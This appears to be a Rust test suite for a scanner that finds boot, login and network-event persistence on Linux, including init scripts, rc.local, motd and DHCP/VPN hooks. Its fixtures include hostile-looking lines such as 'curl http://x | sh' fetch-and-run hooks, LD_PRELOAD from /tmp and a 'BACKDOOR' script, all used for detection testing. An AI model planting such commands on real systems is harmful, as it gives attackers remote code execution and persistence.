        assert_eq!((agent.enabled, agent.trigger, agent.raw["runlevels"].as_str()), (Enablement::Enabled, Trigger::Boot, "default, nonetwork"), "local is in default, and nonetwork stacks default");
        assert_eq!(agent.raw["run_by"], "OpenRC's local service, with eval");
        assert_eq!(one(&s, Kind::RcLocal, "20-quiet.start").raw["not_run"], "the local service runs only executable files");
        let bye = one(&s, Kind::RcLocal, "90-bye.stop");
        assert_eq!((bye.enabled, bye.trigger), (Enablement::Enabled, Trigger::PowerEvent));
        assert!(!of_kind(&s, Kind::RcLocal).iter().any(|e| e.name == "README"));

        // Take local out of every runlevel: local.d runs nothing.
        fs::remove_file(dir.join("etc/runlevels/default/local")).unwrap();
        let s = scan(&dir);
        assert_eq!(one(&s, Kind::RcLocal, "10-agent.start").raw["not_run"], "the local service is in no runlevel");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn under_systemd_an_installed_openrc_changes_nothing() {
        let dir = tree("openrc-systemd");
        put(&dir, "sbin/openrc-run", b"\x7fELF openrc-run", 0o755);
        put(&dir, "lib/systemd/systemd", b"\x7fELF systemd", 0o755);
        link(&dir, "/lib/systemd/systemd", "sbin/init");
        put(&dir, "etc/init.d/ssh", SSH, 0o755);
        link(&dir, "../init.d/ssh", "etc/rc2.d/S01ssh");
        fs::create_dir_all(dir.join("etc/runlevels/default")).unwrap();
        link(&dir, "/etc/init.d/ssh", "etc/runlevels/default/ssh");
        put(&dir, "etc/local.d/x.start", b"#!/bin/sh\n", 0o755);
        let s = scan(&dir);
        assert_eq!(one(&s, Kind::SysvInit, "ssh").enabled, Enablement::Enabled, "the generator reads rc2.d");
        assert!(of_kind(&s, Kind::OpenrcService).is_empty());
        assert!(of_kind(&s, Kind::RcLocal).is_empty());
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn under_systemd_only_rc1_to_rc5_start_links_are_read() {
        let script = |dir: &Path, name: &str| put(dir, &format!("etc/init.d/{name}"), SSH, 0o755);
        let host = |tag: &str, systemd: bool| {
            let dir = tree(tag);
            if systemd {
                put(&dir, "lib/systemd/systemd", b"\x7fELF systemd", 0o755);
                link(&dir, "/lib/systemd/systemd", "sbin/init");
            }
            for name in ["at-shutdown", "at-boot", "in-rc2"] {
                script(&dir, name);
            }
            link(&dir, "../init.d/at-shutdown", "etc/rc6.d/S90at-shutdown");
            link(&dir, "../init.d/at-boot", "etc/rcS.d/S10at-boot");
            link(&dir, "../init.d/in-rc2", "etc/rc2.d/S20in-rc2");
            // Outside init.d, in a level nothing under systemd reads.
            link(&dir, "/opt/x", "etc/rc0.d/S99elsewhere");
            dir
        };
        let dir = host("rc-systemd", true);
        let s = scan(&dir);
        assert_eq!(one(&s, Kind::SysvInit, "in-rc2").enabled, Enablement::Enabled);
        for name in ["at-shutdown", "at-boot"] {
            let e = one(&s, Kind::SysvInit, name);
            assert_eq!(e.enabled, Enablement::Disabled, "{name}");
            assert!(e.raw["unread_runlevels"] == "6" || e.raw["unread_runlevels"] == "S");
        }
        assert_eq!(one(&s, Kind::SysvInit, "S99elsewhere").raw["not_run"], "systemd reads only rc1.d to rc5.d");
        fs::remove_dir_all(&dir).unwrap();
        // The same links under sysvinit run at shutdown and at boot.
        let dir = host("rc-sysvinit", false);
        let s = scan(&dir);
        for name in ["at-shutdown", "at-boot", "in-rc2"] {
            assert_eq!(one(&s, Kind::SysvInit, name).enabled, Enablement::Enabled, "{name}");
        }
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_runlevel_link_leaving_init_d_is_its_own_finding() {
        let dir = tree("outside");
        put(&dir, "etc/init.d/ssh", SSH, 0o755);
        put(&dir, "usr/local/bin/payload.sh", b"#!/usr/bin/perl\n", 0o755);
        link(&dir, "/usr/local/bin/payload.sh", "etc/rc2.d/S99payload");
        // A real file rather than a link: rc runs it just the same.
        put(&dir, "etc/rc3.d/S40inline", b"#!/bin/sh\nBACKDOOR=1\n", 0o755);

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let payload = one(&s, Kind::SysvInit, "S99payload");
        assert_eq!(payload.enabled, Enablement::Enabled);
        assert_eq!(payload.raw["outside_init_d"], "true");
        assert_eq!(payload.raw["runlevel"], "2");
        assert_eq!(payload.raw["priority"], "99");
        assert_eq!(payload.raw["action"], "start");
        assert_eq!(payload.raw["interpreter"], "/usr/bin/perl");
        assert_eq!(payload.target_path, Some(dir.join("usr/local/bin/payload.sh")));

        let inline = one(&s, Kind::SysvInit, "S40inline");
        assert_eq!(inline.raw["not_a_symlink"], "true");
        assert_eq!(inline.raw["env.BACKDOOR"], "1");

        assert_eq!(one(&s, Kind::SysvInit, "ssh").enabled, Enablement::Disabled);
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_dangling_runlevel_link_is_reported_not_fatal() {
        let dir = tree("dangling");
        fs::create_dir_all(dir.join("etc/init.d")).unwrap();
        link(&dir, "../init.d/gone", "etc/rc2.d/S02gone");
        link(&dir, "S02gone", "etc/rc2.d/S03loop");
        link(&dir, "/", "etc/rc2.d/S04root");

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let gone = one(&s, Kind::SysvInit, "S02gone");
        assert_eq!(gone.raw["dangling_symlink"], "true");
        assert_eq!(gone.raw["symlink_target"], "../init.d/gone");
        // The target names init.d, it just is not there.
        assert!(!gone.raw.contains_key("outside_init_d"));
        assert_eq!(gone.enabled, Enablement::Enabled, "the runlevel still tries to start it");

        assert!(s.entries.iter().any(|e| e.name == "S03loop"));
        assert_eq!(one(&s, Kind::SysvInit, "S04root").raw["not_a_regular_file"], "true");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn merged_usr_names_for_one_directory_are_walked_once() {
        let dir = tree("merged");
        put(&dir, "etc/rc.d/init.d/ssh", SSH, 0o755);
        fs::create_dir_all(dir.join("etc/rc.d/rc2.d")).unwrap();
        link(&dir, "rc.d/init.d", "etc/init.d");
        link(&dir, "rc.d/rc2.d", "etc/rc2.d");
        link(&dir, "../init.d/ssh", "etc/rc.d/rc2.d/S01ssh");
        put(&dir, "usr/lib/NetworkManager/dispatcher.d/10-hook", b"#!/bin/sh\n", 0o755);
        link(&dir, "usr/lib", "lib");

        let s = scan(&dir);
        let sysv = of_kind(&s, Kind::SysvInit);
        assert_eq!(sysv.len(), 1, "one directory reached by two names is one script");
        assert_eq!(sysv[0].enabled, Enablement::Enabled);
        assert_eq!(sysv[0].raw["start_runlevels"], "2");

        assert_eq!(of_kind(&s, Kind::NetworkDispatcher).len(), 1, "/lib and /usr/lib are one dir");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn rc_local_without_the_execute_bit_does_not_run() {
        let dir = tree("rclocal");
        put(&dir, "etc/rc.local", b"#!/bin/sh\nPATH=/tmp\n/tmp/x\nexit 0\n", 0o644);
        put(&dir, "etc/rc.d/rc.local", b"#!/bin/bash\n/usr/local/bin/y\n", 0o755);
        put(&dir, "opt/shutdown.sh", b"#!/bin/sh\n", 0o755);
        link(&dir, "/opt/shutdown.sh", "etc/rc.local.shutdown");

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));
        assert_eq!(of_kind(&s, Kind::RcLocal).len(), 3, "all three paths are distinct files");

        let inert = s
            .entries
            .iter()
            .find(|e| e.kind == Kind::RcLocal && e.source == dir.join("etc/rc.local"))
            .unwrap();
        assert_eq!(inert.enabled, Enablement::Disabled, "no execute bit, no execution");
        assert_eq!(inert.raw["executable"], "false");
        assert_eq!(inert.command, None);
        assert_eq!(inert.target_path, Some(dir.join("etc/rc.local")));
        assert_eq!(inert.raw["interpreter"], "/bin/sh");
        assert_eq!(inert.raw["env.PATH"], "/tmp");
        assert_eq!(inert.trigger, Trigger::Boot);
        assert_eq!(inert.principal.as_deref(), Some("root"));

        let live = s
            .entries
            .iter()
            .find(|e| e.kind == Kind::RcLocal && e.source == dir.join("etc/rc.d/rc.local"))
            .unwrap();
        assert_eq!(live.enabled, Enablement::Enabled);
        assert_eq!(live.raw["interpreter"], "/bin/bash");

        let shutdown = one(&s, Kind::RcLocal, "rc.local.shutdown");
        assert_eq!(shutdown.raw["is_symlink"], "true");
        assert_eq!(shutdown.raw["symlink_target"], "/opt/shutdown.sh");
        assert_eq!(shutdown.enabled, Enablement::Enabled, "the link resolves to an executable");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn motd_scripts_run_at_every_login() {
        let dir = tree("motd");
        put(&dir, "etc/update-motd.d/10-help-text", b"#!/bin/sh\necho hi\n", 0o755);
        put(&dir, "etc/update-motd.d/99-off", b"#!/bin/sh\nLD_PRELOAD=/tmp/m.so\n", 0o644);
        // Executable, but not a name run-parts --lsbsysinit runs.
        put(&dir, "etc/update-motd.d/50-landscape-sysinfo.sh", b"#!/bin/sh\n", 0o755);
        put(&dir, "etc/update-motd.d/60-Upper", b"#!/bin/sh\n", 0o755);

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let live = one(&s, Kind::Motd, "10-help-text");
        assert_eq!(live.enabled, Enablement::Enabled);
        assert_eq!(live.trigger, Trigger::Login);
        assert_eq!(live.principal.as_deref(), Some("root"));
        assert_eq!(live.command, None);
        assert_eq!(live.target_path, Some(dir.join("etc/update-motd.d/10-help-text")));

        for name in ["50-landscape-sysinfo.sh", "60-Upper"] {
            let e = one(&s, Kind::Motd, name);
            assert_eq!(e.enabled, Enablement::Disabled, "{name}");
            assert!(e.raw["not_run"].contains("--lsbsysinit"), "{name}: {}", e.raw["not_run"]);
        }
        let off = one(&s, Kind::Motd, "99-off");
        assert_eq!(off.enabled, Enablement::Disabled);
        assert_eq!(off.raw["env.LD_PRELOAD"], "/tmp/m.so");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn a_dispatcher_script_networkmanager_refuses_is_not_enabled() {
        let dir = tree("nm");
        let base = "etc/NetworkManager/dispatcher.d";
        put(&dir, &format!("{base}/01-ifupdown"), b"#!/bin/sh\n", 0o755);
        put(&dir, &format!("{base}/99-loose"), b"#!/bin/sh\ncurl http://x | sh\n", 0o777);
        put(&dir, &format!("{base}/pre-up.d/10-early"), b"#!/bin/sh\n", 0o755);
        put(&dir, &format!("{base}/no-wait.d/20-async"), b"#!/bin/sh\n", 0o644);

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let loose = one(&s, Kind::NetworkDispatcher, "99-loose");
        assert_eq!(loose.enabled, Enablement::Disabled, "executable but refused");
        assert!(
            loose.raw["skipped_by_networkmanager"].contains("writable by group or other"),
            "{:?}",
            loose.raw.get("skipped_by_networkmanager")
        );
        assert_eq!(loose.raw["executable"], "true");
        assert_eq!(loose.raw["hook_phase"], "dispatch");
        assert_eq!(loose.trigger, Trigger::NetworkEvent);
        assert!(loose.has_flag(Flag::WorldWritable));

        let tidy = one(&s, Kind::NetworkDispatcher, "01-ifupdown");
        assert!(
            !tidy.raw.get("skipped_by_networkmanager").is_some_and(|r| r.contains("writable")),
            "0755 is not a permission NetworkManager objects to"
        );

        assert_eq!(one(&s, Kind::NetworkDispatcher, "10-early").raw["hook_phase"], "pre-up");
        let async_hook = one(&s, Kind::NetworkDispatcher, "20-async");
        assert_eq!(async_hook.raw["hook_phase"], "no-wait");
        assert_eq!(async_hook.enabled, Enablement::Disabled, "not executable");

        assert_eq!(of_kind(&s, Kind::NetworkDispatcher).len(), 4, "subdirectories are not scripts");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn networkmanager_passes_over_backups_and_runs_the_earlier_of_two_same_named_scripts() {
        let dir = tree("nm-names");
        let (etc, vendor) = ("etc/NetworkManager/dispatcher.d", "usr/lib/NetworkManager/dispatcher.d");
        put(&dir, &format!("{etc}/10-local"), b"#!/bin/sh\n", 0o755);
        put(&dir, &format!("{vendor}/10-local"), b"#!/bin/sh\n", 0o755);
        put(&dir, &format!("{vendor}/20-only-vendor"), b"#!/bin/sh\n", 0o755);
        for backup in [".hidden", "30-x~", "30-x.rpmsave", "30-x.dpkg-old"] {
            put(&dir, &format!("{etc}/{backup}"), b"#!/bin/sh\n", 0o755);
        }
        let s = scan(&dir);
        let scripts = of_kind(&s, Kind::NetworkDispatcher);
        // The fixture is not root's, so nothing is Enabled here: what each says
        // NetworkManager passes over it for is what is read.
        let refused = |name: &str, under: &str| {
            scripts
                .iter()
                .find(|e| e.name == name && e.source.starts_with(dir.join(under)))
                .and_then(|e| e.raw.get("skipped_by_networkmanager").cloned())
                .unwrap_or_default()
        };
        assert!(!refused("10-local", etc).contains("earlier directory"));
        assert!(refused("10-local", vendor).contains("same name in an earlier directory"), "the /etc copy is run instead");
        assert!(!refused("20-only-vendor", vendor).contains("earlier directory"));
        for backup in [".hidden", "30-x~", "30-x.rpmsave", "30-x.dpkg-old"] {
            assert!(refused(backup, etc).contains("backup or package-manager copy"), "{backup}");
        }
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn hostile_scripts_yield_entries_rather_than_a_crash() {
        let dir = tree("hostile");
        let mut huge = b"#!/bin/sh\n".to_vec();
        huge.extend(std::iter::repeat_n(b'x', 10 * 1024 * 1024));
        put(&dir, "etc/init.d/huge", &huge, 0o755);
        link(&dir, "../init.d/huge", "etc/rc2.d/S01huge");

        // A name and a body that are not UTF-8, and an unterminated quote.
        let name = OsStr::from_bytes(b"etc/update-motd.d/50-\xff\xfe");
        let p = dir.join(name);
        fs::create_dir_all(p.parent().unwrap()).unwrap();
        fs::write(&p, b"#!/bin/\xff\xfe\nLD_PRELOAD=\"/tmp/\xfe.so\nBAD=\n").unwrap();
        fs::set_permissions(&p, PermissionsExt::from_mode(0o755)).unwrap();

        put(&dir, "etc/rc2.d/S", b"", 0o755);
        put(&dir, "etc/rc2.d/README", b"not a link\n", 0o644);

        // Opening a FIFO read-only blocks until somebody writes to it. If the
        // regular-file guard ever goes, this test hangs rather than fails,
        // which is precisely the behaviour it exists to prevent.
        rustix::fs::mknodat(
            rustix::fs::CWD,
            dir.join("etc/update-motd.d/60-pipe"),
            rustix::fs::FileType::Fifo,
            rustix::fs::Mode::RUSR | rustix::fs::Mode::XUSR,
            0,
        )
        .unwrap();

        let s = scan(&dir);
        assert!(matches!(status(&s), Status::Complete), "{:?}", status(&s));

        let huge = one(&s, Kind::SysvInit, "huge");
        assert_eq!(huge.enabled, Enablement::Enabled);
        assert_eq!(huge.raw["interpreter"], "/bin/sh");
        assert!(
            s.header.collectors[0].truncated.iter().any(|t| t.contains("huge")),
            "the cap is reported, not hidden"
        );

        assert_eq!(of_kind(&s, Kind::Motd).len(), 2);
        let bad = one(&s, Kind::Motd, "50-\u{fffd}\u{fffd}");
        assert!(bad.has_flag(Flag::EncodingAnomaly), "a non-UTF-8 shebang is evidence");
        assert!(bad.raw.contains_key("shebang_hex"));
        assert_eq!(bad.raw["name_raw_hex"], "35302dfffe");
        assert_eq!(bad.raw["env.LD_PRELOAD"], "/tmp/\u{fffd}.so");
        assert_eq!(bad.raw["env.BAD"], "");

        let pipe = one(&s, Kind::Motd, "60-pipe");
        assert_eq!(pipe.raw["not_a_regular_file"], "true");
        assert_eq!(pipe.enabled, Enablement::Disabled);

        assert!(s.entries.iter().any(|e| e.name == "S"), "a bare S is still an S entry");
        assert!(!s.entries.iter().any(|e| e.name == "README"), "rc runs S* and K* only");
        fs::remove_dir_all(&dir).unwrap();
    }

    fn hook<'a>(s: &'a Scan, rel: &str) -> &'a Entry {
        s.entries
            .iter()
            .find(|e| e.source.to_string_lossy().ends_with(rel))
            .unwrap_or_else(|| panic!("no entry for {rel}: {:?}", s.entries.iter().map(|e| &e.source).collect::<Vec<_>>()))
    }

    #[test]
    fn debian_dhclient_sources_what_run_parts_lists_whatever_its_mode() {
        let d = tree("dhclient-deb");
        put(&d, "sbin/dhclient-script", b"run_hookdir() {\n for script in $(run-parts --list $dir); do run_hook $script; done\n}\n", 0o755);
        put(&d, "etc/dhcp/dhclient-exit-hooks", b"curl -s http://x | sh\n", 0o644);
        put(&d, "etc/dhcp/dhclient-exit-hooks.d/zz-wake", b"/opt/listener &\n", 0o644);
        put(&d, "etc/dhcp/dhclient-exit-hooks.d/old.bak", b"true\n", 0o755);
        put(&d, "etc/dhcp/dhclient-enter-hooks.d/resolved-enter", b"true\n", 0o644);
        let s = scan(&d);
        let wake = hook(&s, "exit-hooks.d/zz-wake");
        assert_eq!((wake.kind, wake.trigger, wake.enabled), (Kind::NetworkDispatcher, Trigger::NetworkEvent, Enablement::Enabled));
        assert_eq!(wake.raw["dispatcher"], "dhclient");
        assert_eq!(wake.raw["hook_phase"], "exit");
        assert_eq!(hook(&s, "etc/dhcp/dhclient-exit-hooks").enabled, Enablement::Enabled, "the single file is sourced too");
        let bak = hook(&s, "old.bak");
        assert_eq!(bak.enabled, Enablement::Disabled, "run-parts skips a dotted name, executable or not");
        assert!(bak.raw["not_run"].contains("run-parts"));
        assert_eq!(hook(&s, "resolved-enter").raw["hook_phase"], "enter");
    }

    #[test]
    fn fedora_dhclient_runs_executable_files_at_any_depth_and_its_own_extras() {
        let d = tree("dhclient-fed");
        put(&d, "usr/sbin/dhclient-script", b"for script in $(find $dir -executable ! -empty); do\n", 0o755);
        put(&d, "etc/dhcp/dhclient-exit-hooks.d/nested/deep.sh", b"/opt/x\n", 0o755);
        put(&d, "etc/dhcp/dhclient-exit-hooks.d/off", b"/opt/y\n", 0o644);
        put(&d, "etc/dhcp/dhclient-exit-hooks.d/empty", b"", 0o755);
        put(&d, "etc/dhcp/dhclient-up-hooks", b"/opt/up\n", 0o755);
        put(&d, "etc/dhcp/dhclient.d/ntp.sh", b"ntp_config() { /opt/ntp; }\n", 0o755);
        put(&d, "etc/dhcp/dhclient.d/chrony.sh", b"true\n", 0o644);
        let s = scan(&d);
        assert_eq!(hook(&s, "nested/deep.sh").enabled, Enablement::Enabled, "find descends and any name counts");
        assert_eq!(hook(&s, "exit-hooks.d/off").enabled, Enablement::Disabled);
        assert_eq!(hook(&s, "exit-hooks.d/empty").enabled, Enablement::Disabled);
        assert_eq!(hook(&s, "dhclient-up-hooks").raw["hook_phase"], "up");
        assert_eq!(hook(&s, "dhclient.d/ntp.sh").enabled, Enablement::Enabled);
        assert_eq!(hook(&s, "dhclient.d/chrony.sh").enabled, Enablement::Disabled);
    }

    #[test]
    fn dhcpcd_hooks_come_from_the_list_in_its_own_run_hooks_script() {
        let d = tree("dhcpcd");
        put(
            &d,
            "usr/libexec/dhcpcd-run-hooks",
            b"for hook in \\\n\t/etc/dhcpcd.enter-hook \\\n\t/usr/libexec/dhcpcd-hooks/* \\\n\t/etc/dhcpcd.exit-hook\ndo\n",
            0o755,
        );
        put(&d, "etc/dhcpcd.exit-hook", b"/opt/wake &\n", 0o644);
        put(&d, "usr/libexec/dhcpcd-hooks/20-resolv.conf", b"true\n", 0o644);
        put(&d, "usr/libexec/dhcpcd-hooks/30-hostname", b"true\n", 0o644);
        put(&d, "usr/libexec/dhcpcd-hooks/50-ntp.conf", b"true\n", 0o644);
        put(&d, "usr/libexec/dhcpcd-hooks/40-edit~", b"true\n", 0o644);
        put(&d, "usr/libexec/dhcpcd-hooks/.hidden", b"true\n", 0o644);
        put(&d, "etc/dhcpcd.conf", b"nohook hostname\ninterface eth0\nnohook ntp.conf\n", 0o644);
        let s = scan(&d);
        let exit = hook(&s, "etc/dhcpcd.exit-hook");
        assert_eq!((exit.enabled, exit.raw["dispatcher"].as_str(), exit.raw["hook_phase"].as_str()), (Enablement::Enabled, "dhcpcd", "exit"));
        assert_eq!(hook(&s, "20-resolv.conf").enabled, Enablement::Enabled);
        assert_eq!(hook(&s, "30-hostname").enabled, Enablement::Disabled, "nohook matches after the two-digit prefix");
        let ntp = hook(&s, "50-ntp.conf");
        assert_eq!(ntp.enabled, Enablement::Enabled, "a nohook inside an interface block applies to that interface only");
        assert_eq!(ntp.raw["nohook_for_some_interfaces"], "true");
        assert_eq!(hook(&s, "40-edit~").enabled, Enablement::Disabled);
        assert!(s.entries.iter().all(|e| !e.source.ends_with(".hidden")), "a shell glob skips dotfiles");
    }

    #[test]
    fn dhcp_hooks_without_their_client_run_nothing() {
        let d = tree("dhcp-none");
        put(&d, "etc/dhcp/dhclient-exit-hooks.d/zz", b"/opt/x\n", 0o755);
        put(&d, "etc/dhcpcd.exit-hook", b"/opt/x\n", 0o644);
        assert!(scan(&d).entries.is_empty());
    }

    #[test]
    fn a_crypttab_keyscript_is_a_boot_program() {
        let d = crate::testing::Tree::new("crypttab");
        std::fs::create_dir_all(d.join("etc")).unwrap();
        std::fs::write(
            d.join("etc/crypttab"),
            "# <target> <source> <key> <options>\n\
             root_crypt UUID=abc none luks,discard,keyscript=decrypt_keyctl\n\
             data /dev/sdb1 /etc/k luks,keyscript=/usr/local/sbin/getkey\n\
             swap /dev/sdc1 /dev/urandom swap\n\
             short /dev/sdd\n",
        )
        .unwrap();
        let root = crate::root::Root::at(&d).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(InitScripts)];
        let s = crate::scan::run(&root, &crate::scan::Options { deep: false }, &collectors);
        let mut got: Vec<(&str, Option<&Path>, Enablement)> =
            s.entries.iter().map(|e| (e.name.as_str(), e.target_path.as_deref(), e.enabled)).collect();
        got.sort();
        assert_eq!(
            got,
            [
                ("keyscript:data", Some(Path::new("/usr/local/sbin/getkey")), Enablement::Unknown),
                ("keyscript:root_crypt", Some(Path::new("/lib/cryptsetup/scripts/decrypt_keyctl")), Enablement::Unknown),
            ]
        );
    }

    #[test]
    fn network_hooks_follow_each_tools_rules() {
        use std::os::unix::fs::PermissionsExt;
        let d = crate::testing::Tree::new("nethooks");
        let put = |rel: &str, body: &[u8], mode: u32| {
            let p = d.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, body).unwrap();
            std::fs::set_permissions(&p, std::fs::Permissions::from_mode(mode)).unwrap();
        };
        for dir in ["etc/networkd-dispatcher/routable.d", "usr/lib/networkd-dispatcher/routable.d"] {
            std::fs::create_dir_all(d.join(dir)).unwrap();
            std::fs::set_permissions(d.join(dir), std::fs::Permissions::from_mode(0o755)).unwrap();
        }
        put("etc/networkd-dispatcher/routable.d/50-a", b"#!/bin/sh\n", 0o755);
        put("usr/lib/networkd-dispatcher/routable.d/50-a", b"#!/bin/sh\n", 0o755);
        put("etc/networkd-dispatcher/routable.d/60-loose", b"#!/bin/sh\n", 0o775);
        put("sbin/ifup", b"", 0o755);
        put("etc/network/if-up.d/beacon", b"#!/bin/sh\n", 0o755);
        put("etc/network/if-up.d/x.sh", b"#!/bin/sh\n", 0o755);
        put("etc/network/interfaces", b"source /etc/network/interfaces.d/*\niface eth0 inet dhcp\n  post-up /opt/pu --now\n", 0o644);
        put("etc/network/interfaces.d/wlan", b"iface wlan0 inet dhcp\n  pre-up /opt/wl\n", 0o644);
        put("usr/sbin/pppd", b"", 0o755);
        put("etc/ppp/ip-up.d/route", b"#!/bin/sh\n", 0o755);
        put("etc/ppp/ip-up.local", b"#!/bin/sh\n", 0o755);
        put("etc/wireguard/wg0.conf", b"[Interface]\nPrivateKey = x\nPostUp = /opt/wg-up %i\n[Peer]\nPostUp = /not/interface\n", 0o600);
        std::fs::create_dir_all(d.join("etc/systemd/system/multi-user.target.wants")).unwrap();
        std::os::unix::fs::symlink("/lib/systemd/system/wg-quick@.service", d.join("etc/systemd/system/multi-user.target.wants/wg-quick@wg0.service")).unwrap();

        let root = crate::root::Root::at(&d).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(InitScripts)];
        let s = crate::scan::run(&root, &crate::scan::Options { deep: false }, &collectors);
        let state = |rel: &str| s.entries.iter().find(|e| e.source == d.join(rel)).map(|e| e.enabled).unwrap_or_else(|| panic!("no {rel}"));
        let cmd = |c: &str| s.entries.iter().find(|e| e.command.as_deref() == Some(c.as_bytes())).unwrap_or_else(|| panic!("no {c}"));
        // The fixture is owned by whoever runs the test; root only when root does.
        let root_run = rustix::process::geteuid().is_root();
        assert_eq!(state("etc/networkd-dispatcher/routable.d/50-a"), if root_run { Enablement::Enabled } else { Enablement::Disabled });
        assert_eq!(state("usr/lib/networkd-dispatcher/routable.d/50-a"), Enablement::Disabled);
        assert_eq!(state("etc/networkd-dispatcher/routable.d/60-loose"), Enablement::Disabled, "0775 is not 0755");
        assert_eq!(state("etc/network/if-up.d/beacon"), Enablement::Enabled);
        assert_eq!(state("etc/network/if-up.d/x.sh"), Enablement::Disabled);
        assert_eq!(cmd("/opt/pu --now").raw["interface"], "eth0");
        assert_eq!(cmd("/opt/wl").raw["hook_phase"], "pre-up", "a sourced file's stanzas count");
        assert_eq!(state("etc/ppp/ip-up.local"), Enablement::Enabled);
        assert_eq!(state("etc/ppp/ip-up.d/route"), Enablement::Disabled, "ip-up.local runs instead");
        let wg = cmd("/opt/wg-up %i");
        assert_eq!((wg.enabled, wg.raw["hook_phase"].as_str()), (Enablement::Enabled, "PostUp"));
        assert!(s.entries.iter().all(|e| e.command.as_deref() != Some(&b"/not/interface"[..])));
    }

    #[test]
    fn openvpn_scripts_run_by_script_security_and_ifplugd_by_run_parts() {
        use std::os::unix::fs::PermissionsExt;
        let d = crate::testing::Tree::new("ovpn");
        let put = |rel: &str, body: &[u8], mode: u32| {
            let p = d.join(rel);
            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
            std::fs::write(&p, body).unwrap();
            std::fs::set_permissions(&p, std::fs::Permissions::from_mode(mode)).unwrap();
        };
        put("usr/sbin/openvpn", b"", 0o755);
        put("etc/openvpn/office.conf", b"remote vpn.example 1194\nup \"/etc/openvpn/up.sh --x\"\n; down /commented\n", 0o600);
        put("etc/openvpn/client/home.conf", b"remote h 1194\nup scripts/up.sh\nplugin /usr/lib/openvpn/evil.so\n", 0o600);
        put("etc/openvpn/server/srv.conf", b"script-security 2\nclient-connect /opt/cc\n", 0o600);
        std::fs::create_dir_all(d.join("etc/systemd/system/multi-user.target.wants")).unwrap();
        std::os::unix::fs::symlink("/lib/systemd/system/openvpn-server@.service", d.join("etc/systemd/system/multi-user.target.wants/openvpn-server@srv.service")).unwrap();
        put("usr/sbin/ifplugd", b"", 0o755);
        put("etc/ifplugd/action.d/mount-nfs", b"#!/bin/sh\n", 0o755);

        let root = crate::root::Root::at(&d).unwrap();
        let collectors: Vec<Box<dyn Collector>> = vec![Box::new(InitScripts)];
        let s = crate::scan::run(&root, &crate::scan::Options { deep: false }, &collectors);
        let by = |phase: &str, conf: &str| {
            s.entries.iter().find(|e| e.raw.get("hook_phase").is_some_and(|p| p == phase) && e.source == d.join(conf)).unwrap_or_else(|| panic!("no {phase} in {conf}"))
        };
        let office = by("up", "etc/openvpn/office.conf");
        assert_eq!((office.command.as_deref(), office.enabled), (Some(&b"/etc/openvpn/up.sh --x"[..]), Enablement::Unknown), "openvpn@ passes script-security 2");
        let home = by("up", "etc/openvpn/client/home.conf");
        assert_eq!(home.enabled, Enablement::Disabled, "openvpn-client@ does not, and the file does not either");
        assert_eq!(home.target_path, Some(PathBuf::from("/etc/openvpn/client/scripts/up.sh")), "relative to the unit's directory");
        assert_eq!(by("plugin", "etc/openvpn/client/home.conf").enabled, Enablement::Unknown, "a plugin loads whatever script-security says");
        assert_eq!(by("client-connect", "etc/openvpn/server/srv.conf").enabled, Enablement::Enabled);
        assert!(!s.entries.iter().any(|e| e.command.as_deref() == Some(&b"/commented"[..])));
        assert!(s.entries.iter().any(|e| e.name == "mount-nfs" && e.enabled == Enablement::Enabled));
    }
}
